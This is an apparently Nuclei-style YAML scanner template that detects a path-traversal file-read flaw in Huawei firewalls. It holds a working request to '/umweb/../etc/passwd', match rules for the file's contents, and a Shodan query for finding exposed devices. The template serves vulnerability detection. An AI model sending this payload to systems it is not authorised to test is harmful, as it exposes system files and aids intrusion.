http:
- matchers:
  - part: body
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  - part: header
    type: word
    words:
    - application/octet-stream
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/umweb/../etc/passwd'
id: huawei-firewall-lfi
info:
  author: taielab
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: Huawei Firewall is vulnerable to LFI(Local File Inclusion)
  metadata:
    max-request: 1
    shodan-query: title:"HUAWEI"
    verified: true
  name: Huawei Firewall - Local File Inclusion
  severity: high
  tags: huawei,firewall,lfi
